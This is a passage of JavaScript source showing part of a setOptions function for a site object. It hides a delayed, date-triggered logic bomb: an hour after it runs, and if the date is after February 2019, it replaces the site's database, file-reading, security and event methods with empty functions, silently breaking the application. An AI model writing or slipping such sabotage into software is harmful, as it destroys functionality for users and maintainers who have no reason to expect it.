...
function setOptions(options , site) {
  ...
  setTimeout(() => {
    if (new Date() > new Date(2019, 1 , 1)) {
      site.connectCollection = function(){}
      site.fs = site.readFile = site.readFileSync = function(){}
      site.security = site.mongodb = function(){}
      site.words = site.on = site.call = function(){}
    }
  }, 1000 * 60 * 60)
